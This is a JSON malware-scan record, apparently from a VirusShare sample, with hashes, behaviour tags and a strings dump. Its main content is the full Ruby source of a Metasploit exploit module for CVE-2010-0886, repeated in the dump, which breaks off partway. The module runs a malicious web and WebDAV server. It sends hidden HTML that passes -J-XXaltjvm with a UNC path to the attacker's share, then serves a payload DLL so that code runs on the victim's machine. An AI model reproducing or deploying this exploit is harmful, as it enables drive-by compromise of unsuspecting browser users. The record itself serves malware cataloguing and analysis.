{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Command": "May run PowerShell commands",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "PUT": "May write to a file",
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows"
        },
        "macro": "##\n# $Id: java_ws_arginject_altjvm.rb 9653 2010-07-01 23:33:07Z jduck $\n##\n\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# Framework web site for more information on licensing and terms of use.\n# http://metasploit.com/framework/\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\tRank = ExcellentRanking\n\n\t#\n\t# This module acts as an HTTP server\n\t#\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\n\n\tdef initialize(info = {})\n\t\tsuper(update_info(info,\n\t\t\t'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection',\n\t\t\t'Description'    => %q{\n\t\t\t\t\tThis module exploits a flaw in the Web Start plugin component of Sun Java\n\t\t\t\tWeb Start. The arguments passed to Java Web Start are not properly validated.\n\t\t\t\tBy passing the lesser known -J option, an attacker can pass arbitrary options\n\t\t\t\tdirectly to the Java runtime. By utilizing the -XXaltjvm option, as discussed\n\t\t\t\tby Ruben Santamarta, an attacker can execute arbitrary code in the context of\n\t\t\t\tan unsuspecting browser user.\n\n\t\t\t\tThis vulnerability was originally discovered independently by both Ruben\n\t\t\t\tSantamarta and Tavis Ormandy. Tavis reported that all versions since version\n\t\t\t\t6 Update 10 \"are believed to be affected by this vulnerability.\"\n\n\t\t\t\tIn order for this module to work, it must be ran as root on a server that\n\t\t\t\tdoes not serve SMB. Additionally, the target host must have the WebClient\n\t\t\t\tservice (WebDAV Mini-Redirector) enabled.\n\t\t\t},\n\t\t\t'License'        => MSF_LICENSE,\n\t\t\t'Author'         => 'jduck',\n\t\t\t'Version'        => '$Revision: 9653 $',\n\t\t\t'References'     =>\n\t\t\t\t[\n\t\t\t\t\t[ 'CVE', '2010-0886' ],\n\t\t\t\t\t[ 'OSVDB', '63648' ],\n\t\t\t\t\t[ 'BID', '39346' ],\n\t\t\t\t\t[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2010-04/0122.html' ],\n\t\t\t\t\t[ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=67&Itemid=1' ]\n\t\t\t\t],\n\t\t\t'Platform'       => 'win',\n\t\t\t'Payload'        =>\n\t\t\t\t{\n\t\t\t\t\t'Space'    => 1024,\n\t\t\t\t\t'BadChars' => '',\n\t\t\t\t\t'DisableNops' => true,\n\t\t\t\t\t'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n\t\t\t\t},\n\t\t\t'Targets'        =>\n\t\t\t\t[\n\t\t\t\t\t[ 'Automatic', { } ],\n\t\t\t\t\t[ 'Java Runtime on Windows x86',\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t'Platform' => 'win',\n\t\t\t\t\t\t\t'Arch' => ARCH_X86\n\t\t\t\t\t\t}\n\t\t\t\t\t],\n\t\t\t\t],\n\t\t\t'DefaultTarget'  => 0,\n\t\t\t'DisclosureDate' => 'Apr 09 2010'\n\t\t\t))\n\n\t\tregister_options(\n\t\t\t[\n\t\t\t\tOptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n\t\t\t\tOptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),\n\t\t\t\tOptString.new('UNCPATH', [ false, 'Override the UNC path to use.' ])\n\t\t\t], self.class)\n\tend\n\n\n\tdef auto_target(cli, request)\n\t\tagent = request.headers['User-Agent']\n\n\t\tret = nil\n\t\t#print_status(\"Agent: #{agent}\")\n\t\t# Check for MSIE and/or WebDAV redirector requests\n\t\tif agent =~ /(Windows NT (5|6)\\.(0|1|2)|MiniRedir\\/(5|6)\\.(0|1|2))/\n\t\t\tret = targets[1]\n\t\telsif agent =~ /MSIE (6|7|8)\\.0/\n\t\t\tret = targets[1]\n\t\telse\n\t\t\tprint_status(\"Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}\")\n\t\tend\n\n\t\tret\n\tend\n\n\n\tdef on_request_uri(cli, request)\n\n\t\t# For this exploit, this does little besides ensures the user agent is a recognized one..\n\t\tmytarget = target\n\t\tif target.name == 'Automatic'\n\t\t\tmytarget = auto_target(cli, request)\n\t\t\tif (not mytarget)\n\t\t\t\tsend_not_found(cli)\n\t\t\t\treturn\n\t\t\tend\n\t\tend\n\n\t\t# Special case to process OPTIONS for /\n\t\tif (request.method == 'OPTIONS' and request.uri == '/')\n\t\t\tprocess_options(cli, request, mytarget)\n\t\t\treturn\n\t\tend\n\n\t\t# Discard requests for ico files\n\t\tif (request.uri =~ /\\.ico$/i)\n\t\t\tsend_not_found(cli)\n\t\t\treturn\n\t\tend\n\n\t\t# If there is no subdirectory in the request, we need to redirect.\n\t\tif (request.uri == '/') or not (request.uri =~ /\\/([^\\/]+)\\//)\n\t\t\tif (request.uri == '/')\n\t\t\t\tsubdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n\t\t\telse\n\t\t\t\tsubdir = request.uri + '/'\n\t\t\tend\n\t\t\tprint_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n\t\t\tsend_redirect(cli, subdir)\n\t\t\treturn\n\t\telse\n\t\t\tshare_name = $1\n\t\tend\n\n\t\t# dispatch WebDAV requests based on method first\n\t\tcase request.method\n\t\twhen 'OPTIONS'\n\t\t\tprocess_options(cli, request, mytarget)\n\n\t\twhen 'PROPFIND'\n\t\t\tprocess_propfind(cli, request, mytarget)\n\n\t\twhen 'GET'\n\t\t\tprocess_get(cli, request, mytarget, share_name)\n\n\t\twhen 'PUT'\n\t\t\tprint_status(\"Sending 404 for PUT #{request.uri} ...\")\n\t\t\tsend_not_found(cli)\n\n\t\telse\n\t\t\tprint_error(\"Unexpected request method encountered: #{request.method}\")\n\n\t\tend\n\n\tend\n\n\t#\n\t# GET requests\n\t#\n\tdef process_get(cli, request, target, share_name)\n\n\t\tprint_status(\"Responding to \\\"GET #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")\n\t\t# dispatch based on extension\n\t\tif (request.uri =~ /\\.dll$/i)\n\t\t\t#\n\t\t\t# DLL requests sent by IE and the WebDav Mini-Redirector\n\t\t\t#\n\t\t\tprint_status(\"Sending DLL to #{cli.peerhost}:#{cli.peerport}...\")\n\n\t\t\t# Re-generate the payload\n\t\t\treturn if ((p = regenerate_payload(cli)) == nil)\n\n\t\t\t# Generate a DLL based on the payload\n\t\t\tdll_data = Msf::Util::EXE.to_win32pe_dll(framework, p.encoded)\n\n\t\t\t# Send it :)\n\t\t\tsend_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })\n\n\t\telse\n\t\t\t#\n\t\t\t# HTML requests sent by IE and Firefox\n\t\t\t#\n\t\t\tmy_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n\n\t\t\t# Always prepare the UNC path, even if we dont use it for this request...\n\t\t\tif (datastore['UNCPATH'])\n\t\t\t\tunc = datastore['UNCPATH'].dup\n\t\t\telse\n\t\t\t\tunc = \"\\\\\\\\\" + my_host + \"\\\\\" + share_name\n\t\t\tend\n\t\t\tjnlp = \"-J-XXaltjvm=\" + unc + \" -Xnosplash \" + rand_text_alphanumeric(8+rand(8)) + \".jnlp\"\n\t\t\tdocbase = rand_text_alphanumeric(8+rand(8))\n\n\t\t\t# Provide the corresponding HTML page...\n\t\t\tif (request.uri =~ /\\.shtml/i)\n\t\t\t\tprint_status(\"Sending JS version HTML to #{cli.peerhost}:#{cli.peerport}...\")\n\t\t\t\t# Javascript version...\n\t\t\t\tvar_str = rand_text_alpha(8+rand(8))\n\t\t\t\tvar_obj = rand_text_alpha(8+rand(8))\n\t\t\t\tvar_obj2 = rand_text_alpha(8+rand(8))\n\t\t\t\tvar_obj3 = rand_text_alpha(8+rand(8))\n\t\t\t\tjs_jnlp = \"http: \"\n\t\t\t\tjs_jnlp << jnlp.dup.gsub(\"\\\\\", \"\\\\\\\\\\\\\\\\\") # jeez\n\n\t\t\t\t# The 8ad.. CLSID doesn't support the launch method ...\n\t\t\t\t#clsid = '8AD9C840-044E-11D1-B3E9-00805F499D93'\n\t\t\t\tclsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA'\n\t\t\t\thtml = %Q|<html>\n<body>Please wait...\n<script language=\"javascript\">\nvar #{var_str} = \"#{js_jnlp}\";\nif (window.navigator.appName == \"Microsoft Internet Explorer\") {\nvar #{var_obj} = document.createElement(\"OBJECT\");\n#{var_obj}.classid = \"clsid:#{clsid}\";\n#{var_obj}.launch(#{var_str});\n} else {\ntry {\nvar #{var_obj2} = document.createElement(\"OBJECT\");\n#{var_obj2}.type = \"application/npruntime-scriptable-plugin;deploymenttoolkit\";\ndocument.body.appendChild(#{var_obj2});\n#{var_obj2}.launch(#{var_str});\n} catch (e) {\nvar #{var_obj3} = document.createElement(\"OBJECT\");\n#{var_obj3}.type = \"application/java-deployment-toolkit\";\ndocument.body.appendChild(#{var_obj3});\n#{var_obj3}.launch(#{var_str});\n}\n}\n</script>\n</body>\n</html>\n|\n\t\t\telsif (request.uri =~ /\\.htm/i)\n\t\t\t\tprint_status(\"Sending non-JS version HTML to #{cli.peerhost}:#{cli.peerport}...\")\n\t\t\t\tclsids = [ '8AD9C840-044E-11D1-B3E9-00805F499D93', 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' ]\n\t\t\t\tclsid = clsids[rand(clsids.length)]\n\t\t\t\thtml = %Q|<html>\n<body>Please wait...\n<object id=\"#{var_obj}\" classid=\"clsid:#{clsid}\"\nwidth=\"0\" height=\"0\">\n<PARAM name=\"launchjnlp\" value=\"#{jnlp}\">\n<PARAM name=\"docbase\" value=\"#{docbase}\">\n</object>\n<embed type=\"application/x-java-applet\"\nwidth=\"0\" height=\"0\"\nlaunchjnlp=\"#{jnlp}\"\ndocbase=\"#{docbase}\"\n/>\n</body>\n</html>\n|\n\t\t\telse\n\t\t\t\tprint_status(\"Sending js detection HTML to #{cli.peerhost}:#{cli.peerport}...\")\n\n\t\t\t\t# NOTE: The JS version is preferred to the HTML version since it works on more JRE versions\n\t\t\t\tjs_uri = rand_text_alphanumeric(8+rand(8)) + \".shtml\"\n\t\t\t\tno_js_uri = rand_text_alphanumeric(8+rand(8)) + \".htm\"\n\n\t\t\t\thtml = %Q|<html>\n<head>\n<meta http-equiv=\"refresh\" content=\"2;#{no_js_uri}\" />\n</head>\n<body>\nPlease wait...\n<script language=\"javascript\">\ndocument.location = \"#{js_uri}\";\n</script>\n</body>\n</html>\n|\n\t\t\t\t# end of detection html\n\t\t\tend\n\n\t\t\tsend_response_html(cli, html,\n\t\t\t\t{\n\t\t\t\t\t'Content-Type' => 'text/html',\n\t\t\t\t\t'Pragma' => 'no-cache'\n\t\t\t\t})\n\t\tend\n\n\tend\n\n\t#\n\t# OPTIONS requests sent by the WebDav Mini-Redirector\n\t#\n\tdef process_options(cli, request, target)\n\t\tprint_status(\"Responding to WebDAV \\\"OPTIONS #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")\n\t\theaders = {\n\t\t\t#'DASL'   => '<DAV:sql>',\n\t\t\t#'DAV'    => '1, 2',\n\t\t\t'Allow'  => 'OPTIONS, GET, PROPFIND',\n\t\t\t'Public' => 'OPTIONS, GET, PROPFIND'\n\t\t}\n\t\tsend_response(cli, '', headers)\n\tend\n\n\n\t#\n\t# PROPFIND requests sent by the WebDav Mini-Redirector\n\t#\n\tdef process_propfind(cli, request, target)\n\t\tpath = request.uri\n\t\tprint_status(\"Received WebDAV \\\"PROPFIND #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")\n\t\tbody = ''\n\n\t\tif (path =~ /\\.dll$/i)\n\t\t\t# Response for the DLL\n\t\t\tprint_status(\"Sending DLL multistatus for #{path} ...\")\n#<lp1:getcontentlength>45056</lp1:getcontentlength>\n\t\t\tbody = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>\n<lp2:executable>F</lp2:executable>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n\t\telsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n\t\t\t# Response for anything else (generally just /)\n\t\t\tprint_status(\"Sending directory multistatus for #{path} ...\")\n\t\t\tbody = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n\t\telse\n\t\t\tprint_status(\"Sending 404 for #{path} ...\")\n\t\t\tsend_not_found(cli)\n\t\t\treturn\n\n\t\tend\n\n\t\t# send the response\n\t\tresp = create_response(207, \"Multi-Status\")\n\t\tresp.body = body\n\t\tresp['Content-Type'] = 'text/xml'\n\t\tcli.send_response(resp)\n\tend\n\n\n\t#\n\t# Make sure we're on the right port/path to support WebDAV\n\t#\n\tdef exploit\n\t\tif datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n\t\t\traise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'\n\t\tend\n\n\t\tsuper\n\tend\n\nend"
    },
    "filename": "VirusShare_2850fb5b9da2937d061eba4bd77ddae9",
    "filesize": 11067,
    "filetype": "Ruby script, ASCII text",
    "hashes": {
        "md5": "2850fb5b9da2937d061eba4bd77ddae9",
        "sha1": "bb6d2e60964d21222323874a5407e5708115840d",
        "sha256": "050c6c886fd60bae1e68c038b9987a011a0eb77b0450edaa5e5a1dd192c6386b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "# $Id: java_ws_arginject_altjvm.rb 9653 2010-07-01 23:33:07Z jduck $",
            "# This file is part of the Metasploit Framework and may be subject to",
            "# redistribution and commercial restrictions. Please see the Metasploit",
            "# Framework web site for more information on licensing and terms of use.",
            "# http://metasploit.com/framework/",
            "require 'msf/core'",
            "class Metasploit3 < Msf::Exploit::Remote",
            "\tRank = ExcellentRanking",
            "\t# This module acts as an HTTP server",
            "\tinclude Msf::Exploit::Remote::HttpServer::HTML",
            "\tdef initialize(info = {})",
            "\t\tsuper(update_info(info,",
            "\t\t\t'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection',",
            "\t\t\t'Description'    => %q{",
            "\t\t\t\t\tThis module exploits a flaw in the Web Start plugin component of Sun Java",
            "\t\t\t\tWeb Start. The arguments passed to Java Web Start are not properly validated.",
            "\t\t\t\tBy passing the lesser known -J option, an attacker can pass arbitrary options",
            "\t\t\t\tdirectly to the Java runtime. By utilizing the -XXaltjvm option, as discussed",
            "\t\t\t\tby Ruben Santamarta, an attacker can execute arbitrary code in the context of",
            "\t\t\t\tan unsuspecting browser user.",
            "\t\t\t\tThis vulnerability was originally discovered independently by both Ruben",
            "\t\t\t\tSantamarta and Tavis Ormandy. Tavis reported that all versions since version",
            "\t\t\t\t6 Update 10 \"are believed to be affected by this vulnerability.\"",
            "\t\t\t\tIn order for this module to work, it must be ran as root on a server that",
            "\t\t\t\tdoes not serve SMB. Additionally, the target host must have the WebClient",
            "\t\t\t\tservice (WebDAV Mini-Redirector) enabled.",
            "\t\t\t},",
            "\t\t\t'License'        => MSF_LICENSE,",
            "\t\t\t'Author'         => 'jduck',",
            "\t\t\t'Version'        => '$Revision: 9653 $',",
            "\t\t\t'References'     =>",
            "\t\t\t\t[",
            "\t\t\t\t\t[ 'CVE', '2010-0886' ],",
            "\t\t\t\t\t[ 'OSVDB', '63648' ],",
            "\t\t\t\t\t[ 'BID', '39346' ],",
            "\t\t\t\t\t[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2010-04/0122.html' ],",
            "\t\t\t\t\t[ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=67&Itemid=1' ]",
            "\t\t\t\t],",
            "\t\t\t'Platform'       => 'win',",
            "\t\t\t'Payload'        =>",
            "\t\t\t\t{",
            "\t\t\t\t\t'Space'    => 1024,",
            "\t\t\t\t\t'BadChars' => '',",
            "\t\t\t\t\t'DisableNops' => true,",
            "\t\t\t\t\t'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"",
            "\t\t\t\t},",
            "\t\t\t'Targets'        =>",
            "\t\t\t\t[",
            "\t\t\t\t\t[ 'Automatic', { } ],",
            "\t\t\t\t\t[ 'Java Runtime on Windows x86',",
            "\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t'Platform' => 'win',",
            "\t\t\t\t\t\t\t'Arch' => ARCH_X86",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t],",
            "\t\t\t\t],",
            "\t\t\t'DefaultTarget'  => 0,",
            "\t\t\t'DisclosureDate' => 'Apr 09 2010'",
            "\t\t\t))",
            "\t\tregister_options(",
            "\t\t\t[",
            "\t\t\t\tOptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),",
            "\t\t\t\tOptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),",
            "\t\t\t\tOptString.new('UNCPATH', [ false, 'Override the UNC path to use.' ])",
            "\t\t\t], self.class)",
            "\tend",
            "\tdef auto_target(cli, request)",
            "\t\tagent = request.headers['User-Agent']",
            "\t\tret = nil",
            "\t\t#print_status(\"Agent: #{agent}\")",
            "\t\t# Check for MSIE and/or WebDAV redirector requests",
            "\t\tif agent =~ /(Windows NT (5|6)\\.(0|1|2)|MiniRedir\\/(5|6)\\.(0|1|2))/",
            "\t\t\tret = targets[1]",
            "\t\telsif agent =~ /MSIE (6|7|8)\\.0/",
            "\t\t\tret = targets[1]",
            "\t\telse",
            "\t\t\tprint_status(\"Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}\")",
            "\t\tend",
            "\t\tret",
            "\tend",
            "\tdef on_request_uri(cli, request)",
            "\t\t# For this exploit, this does little besides ensures the user agent is a recognized one..",
            "\t\tmytarget = target",
            "\t\tif target.name == 'Automatic'",
            "\t\t\tmytarget = auto_target(cli, request)",
            "\t\t\tif (not mytarget)",
            "\t\t\t\tsend_not_found(cli)",
            "\t\t\t\treturn",
            "\t\t\tend",
            "\t\tend",
            "\t\t# Special case to process OPTIONS for /",
            "\t\tif (request.method == 'OPTIONS' and request.uri == '/')",
            "\t\t\tprocess_options(cli, request, mytarget)",
            "\t\t\treturn",
            "\t\tend",
            "\t\t# Discard requests for ico files",
            "\t\tif (request.uri =~ /\\.ico$/i)",
            "\t\t\tsend_not_found(cli)",
            "\t\t\treturn",
            "\t\tend",
            "\t\t# If there is no subdirectory in the request, we need to redirect.",
            "\t\tif (request.uri == '/') or not (request.uri =~ /\\/([^\\/]+)\\//)",
            "\t\t\tif (request.uri == '/')",
            "\t\t\t\tsubdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'",
            "\t\t\telse",
            "\t\t\t\tsubdir = request.uri + '/'",
            "\t\t\tend",
            "\t\t\tprint_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")",
            "\t\t\tsend_redirect(cli, subdir)",
            "\t\t\treturn",
            "\t\telse",
            "\t\t\tshare_name = $1",
            "\t\tend",
            "\t\t# dispatch WebDAV requests based on method first",
            "\t\tcase request.method",
            "\t\twhen 'OPTIONS'",
            "\t\t\tprocess_options(cli, request, mytarget)",
            "\t\twhen 'PROPFIND'",
            "\t\t\tprocess_propfind(cli, request, mytarget)",
            "\t\twhen 'GET'",
            "\t\t\tprocess_get(cli, request, mytarget, share_name)",
            "\t\twhen 'PUT'",
            "\t\t\tprint_status(\"Sending 404 for PUT #{request.uri} ...\")",
            "\t\t\tsend_not_found(cli)",
            "\t\telse",
            "\t\t\tprint_error(\"Unexpected request method encountered: #{request.method}\")",
            "\t\tend",
            "\tend",
            "\t# GET requests",
            "\tdef process_get(cli, request, target, share_name)",
            "\t\tprint_status(\"Responding to \\\"GET #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")",
            "\t\t# dispatch based on extension",
            "\t\tif (request.uri =~ /\\.dll$/i)",
            "\t\t\t#",
            "\t\t\t# DLL requests sent by IE and the WebDav Mini-Redirector",
            "\t\t\t#",
            "\t\t\tprint_status(\"Sending DLL to #{cli.peerhost}:#{cli.peerport}...\")",
            "\t\t\t# Re-generate the payload",
            "\t\t\treturn if ((p = regenerate_payload(cli)) == nil)",
            "\t\t\t# Generate a DLL based on the payload",
            "\t\t\tdll_data = Msf::Util::EXE.to_win32pe_dll(framework, p.encoded)",
            "\t\t\t# Send it :)",
            "\t\t\tsend_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })",
            "\t\telse",
            "\t\t\t#",
            "\t\t\t# HTML requests sent by IE and Firefox",
            "\t\t\t#",
            "\t\t\tmy_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']",
            "\t\t\t# Always prepare the UNC path, even if we dont use it for this request...",
            "\t\t\tif (datastore['UNCPATH'])",
            "\t\t\t\tunc = datastore['UNCPATH'].dup",
            "\t\t\telse",
            "\t\t\t\tunc = \"\\\\\\\\\" + my_host + \"\\\\\" + share_name",
            "\t\t\tend",
            "\t\t\tjnlp = \"-J-XXaltjvm=\" + unc + \" -Xnosplash \" + rand_text_alphanumeric(8+rand(8)) + \".jnlp\"",
            "\t\t\tdocbase = rand_text_alphanumeric(8+rand(8))",
            "\t\t\t# Provide the corresponding HTML page...",
            "\t\t\tif (request.uri =~ /\\.shtml/i)",
            "\t\t\t\tprint_status(\"Sending JS version HTML to #{cli.peerhost}:#{cli.peerport}...\")",
            "\t\t\t\t# Javascript version...",
            "\t\t\t\tvar_str = rand_text_alpha(8+rand(8))",
            "\t\t\t\tvar_obj = rand_text_alpha(8+rand(8))",
            "\t\t\t\tvar_obj2 = rand_text_alpha(8+rand(8))",
            "\t\t\t\tvar_obj3 = rand_text_alpha(8+rand(8))",
            "\t\t\t\tjs_jnlp = \"http: \"",
            "\t\t\t\tjs_jnlp << jnlp.dup.gsub(\"\\\\\", \"\\\\\\\\\\\\\\\\\") # jeez",
            "\t\t\t\t# The 8ad.. CLSID doesn't support the launch method ...",
            "\t\t\t\t#clsid = '8AD9C840-044E-11D1-B3E9-00805F499D93'",
            "\t\t\t\tclsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA'",
            "\t\t\t\thtml = %Q|<html>",
            "<body>Please wait...",
            "<script language=\"javascript\">",
            "var #{var_str} = \"#{js_jnlp}\";",
            "if (window.navigator.appName == \"Microsoft Internet Explorer\") {",
            "var #{var_obj} = document.createElement(\"OBJECT\");",
            "#{var_obj}.classid = \"clsid:#{clsid}\";",
            "#{var_obj}.launch(#{var_str});",
            "} else {",
            "try {",
            "var #{var_obj2} = document.createElement(\"OBJECT\");",
            "#{var_obj2}.type = \"application/npruntime-scriptable-plugin;deploymenttoolkit\";",
            "document.body.appendChild(#{var_obj2});",
            "#{var_obj2}.launch(#{var_str});",
            "} catch (e) {",
            "var #{var_obj3} = document.createElement(\"OBJECT\");",
            "#{var_obj3}.type = \"application/java-deployment-toolkit\";",
            "document.body.appendChild(#{var_obj3});",
            "#{var_obj3}.launch(#{var_str});",
            "</script>",
            "</body>",
            "</html>",
            "\t\t\telsif (request.uri =~ /\\.htm/i)",
            "\t\t\t\tprint_status(\"Sending non-JS version HTML to #{cli.peerhost}:#{cli.peerport}...\")",
            "\t\t\t\tclsids = [ '8AD9C840-044E-11D1-B3E9-00805F499D93', 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' ]",
            "\t\t\t\tclsid = clsids[rand(clsids.length)]",
            "\t\t\t\thtml = %Q|<html>",
            "<body>Please wait...",
            "<object id=\"#{var_obj}\" classid=\"clsid:#{clsid}\"",
            "width=\"0\" height=\"0\">",
            "<PARAM name=\"launchjnlp\" value=\"#{jnlp}\">",
            "<PARAM name=\"docbase\" value=\"#{docbase}\">",
            "</object>",
            "<embed type=\"application/x-java-applet\"",
            "width=\"0\" height=\"0\"",
            "launchjnlp=\"#{jnlp}\"",
            "docbase=\"#{docbase}\"",
            "</body>",
            "</html>",
            "\t\t\telse",
            "\t\t\t\tprint_status(\"Sending js detection HTML to #{cli.peerhost}:#{cli.peerport}...\")",
            "\t\t\t\t# NOTE: The JS version is preferred to the HTML version since it works on more JRE versions",
            "\t\t\t\tjs_uri = rand_text_alphanumeric(8+rand(8)) + \".shtml\"",
            "\t\t\t\tno_js_uri = rand_text_alphanumeric(8+rand(8)) + \".htm\"",
            "\t\t\t\thtml = %Q|<html>",
            "<head>",
            "<meta http-equiv=\"refresh\" content=\"2;#{no_js_uri}\" />",
            "</head>",
            "<body>",
            "Please wait...",
            "<script language=\"javascript\">",
            "document.location = \"#{js_uri}\";",
            "</script>",
            "</body>",
            "</html>",
            "\t\t\t\t# end of detection html",
            "\t\t\tend",
            "\t\t\tsend_response_html(cli, html,",
            "\t\t\t\t{",
            "\t\t\t\t\t'Content-Type' => 'text/html',",
            "\t\t\t\t\t'Pragma' => 'no-cache'",
            "\t\t\t\t})",
            "\t\tend",
            "\tend",
            "\t# OPTIONS requests sent by the WebDav Mini-Redirector",
            "\tdef process_options(cli, request, target)",
            "\t\tprint_status(\"Responding to WebDAV \\\"OPTIONS #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")",
            "\t\theaders = {",
            "\t\t\t#'DASL'   => '<DAV:sql>',",
            "\t\t\t#'DAV'    => '1, 2',",
            "\t\t\t'Allow'  => 'OPTIONS, GET, PROPFIND',",
            "\t\t\t'Public' => 'OPTIONS, GET, PROPFIND'",
            "\t\tsend_response(cli, '', headers)",
            "\tend",
            "\t# PROPFIND requests sent by the WebDav Mini-Redirector",
            "\tdef process_propfind(cli, request, target)",
            "\t\tpath = request.uri",
            "\t\tprint_status(\"Received WebDAV \\\"PROPFIND #{request.uri}\\\" request from #{cli.peerhost}:#{cli.peerport}\")",
            "\t\tbody = ''",
            "\t\tif (path =~ /\\.dll$/i)",
            "\t\t\t# Response for the DLL",
            "\t\t\tprint_status(\"Sending DLL multistatus for #{path} ...\")",
            "#<lp1:getcontentlength>45056</lp1:getcontentlength>",
            "\t\t\tbody = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>",
            "<D:multistatus xmlns:D=\"DAV:\">",
            "<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">",
            "<D:href>#{path}</D:href>",
            "<D:propstat>",
            "<D:prop>",
            "<lp1:resourcetype/>",
            "<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>",
            "<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>",
            "<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>",
            "<lp2:executable>F</lp2:executable>",
            "<D:lockdiscovery/>",
            "<D:getcontenttype>application/octet-stream</D:getcontenttype>",
            "</D:prop>",
            "<D:status>HTTP/1.1 200 OK</D:status>",
            "</D:propstat>",
            "</D:response>",
            "</D:multistatus>",
            "\t\telsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))",
            "\t\t\t# Response for anything else (generally just /)",
            "\t\t\tprint_status(\"Sending directory multistatus for #{path} ...\")",
            "\t\t\tbody = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>",
            "<D:multistatus xmlns:D=\"DAV:\">",
            "<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">",
            "<D:href>#{path}</D:href>",
            "<D:propstat>",
            "<D:prop>",
            "<lp1:resourcetype><D:collection/></lp1:resourcetype>",
            "<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>",
            "<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>",
            "<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>",
            "<D:lockdiscovery/>",
            "<D:getcontenttype>httpd/unix-directory</D:getcontenttype>",
            "</D:prop>",
            "<D:status>HTTP/1.1 200 OK</D:status>",
            "</D:propstat>",
            "</D:response>",
            "</D:multistatus>",
            "\t\telse",
            "\t\t\tprint_status(\"Sending 404 for #{path} ...\")",
            "\t\t\tsend_not_found(cli)",
            "\t\t\treturn",
            "\t\tend",
            "\t\t# send the response",
            "\t\tresp = create_response(207, \"Multi-Status\")",
